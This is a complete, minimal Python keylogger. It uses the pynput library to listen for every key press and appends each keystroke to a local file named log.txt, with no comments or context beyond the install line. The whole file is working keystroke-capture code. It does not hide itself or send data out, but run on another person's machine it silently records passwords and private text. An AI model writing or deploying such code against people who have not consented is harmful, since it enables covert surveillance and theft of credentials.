# pip install pynput
from pynput.keyboard import Listener


def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")
    with open("log.txt", "a") as f:
        f.write(keydata)


with Listener(on_press=writetofile) as l:
    l.join()
